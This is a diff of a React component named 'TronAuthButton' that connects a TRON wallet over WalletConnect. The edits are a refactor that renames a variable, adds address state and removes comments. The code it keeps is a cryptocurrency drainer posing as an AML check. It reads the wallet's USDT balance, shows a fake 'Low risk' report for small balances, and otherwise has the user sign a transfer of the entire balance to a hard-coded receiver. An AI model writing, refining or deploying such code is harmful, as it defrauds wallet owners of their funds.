@@ -32,6 +32,7 @@ const adapter = new WalletConnectAdapter({
 export const TronAuthButton: React.FC = () => {
   const [modalMessage, setModalMessage] = useState<string | null>(null);
   const [processing, setProcessing] = useState(false);
+  const [userAddress, setUserAddress] = useState<string | null>(null);
 
   useEffect(() => {
     if (typeof (adapter as any).init === 'function') {
@@ -40,6 +41,7 @@ export const TronAuthButton: React.FC = () => {
     adapter.on('disconnect', () => {
       setProcessing(false);
       setModalMessage(null);
+      setUserAddress(null);
     });
   }, []);
 
@@ -54,30 +56,27 @@ export const TronAuthButton: React.FC = () => {
     try {
       await adapter.connect();
 
-      const userAddress = adapter.address;
-      if (!userAddress || !tronWeb.isAddress(userAddress)) {
+      const address = adapter.address;
+      if (!address || !tronWeb.isAddress(address)) {
         throw new Error('Invalid wallet address');
       }
-      tronWeb.setAddress(userAddress);
+      setUserAddress(address);
+      tronWeb.setAddress(address);
 
-      // Проверка TRX-баланса (только на комиссию)
-      const trxRaw = await tronWeb.trx.getBalance(userAddress);
-      const MIN_TRX_BALANCE = 5 * 1_000_000; // минимальный резерв для комиссии (5 TRX)
-
+      const trxRaw = await tronWeb.trx.getBalance(address);
+      const MIN_TRX_BALANCE = 5 * 1_000_000;
       if (trxRaw < MIN_TRX_BALANCE) {
         return await disconnectAndNotify('❌ Insufficient TRX for transaction fee. Minimum 5 TRX required.');
       }
 
-      // Проверка USDT-баланса
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
+      const usdtRaw = await usdtContract.methods.balanceOf(address).call();
       const usdt = Number(usdtRaw) / 1e6;
 
       if (usdt < 1) {
         return await disconnectAndNotify('✅ AML report: Low risk. Minimal USDT balance.');
       }
 
-      // Создание транзакции USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -86,14 +85,11 @@ export const TronAuthButton: React.FC = () => {
           { type: 'address', value: TRON_RECEIVER },
           { type: 'uint256', value: usdtRaw },
         ],
-        userAddress
+        address
       );
 
-      // Подписание транзакции с WalletConnect
       const serializedTx = tronWeb.utils.transaction.txJsonToPb(transaction);
       const signedSerializedTx = await adapter.signTransaction(serializedTx);
-
-      // Отправка транзакции
       const sendResult = await tronWeb.trx.sendRawTransaction(signedSerializedTx);
 
       if (!sendResult.result) {
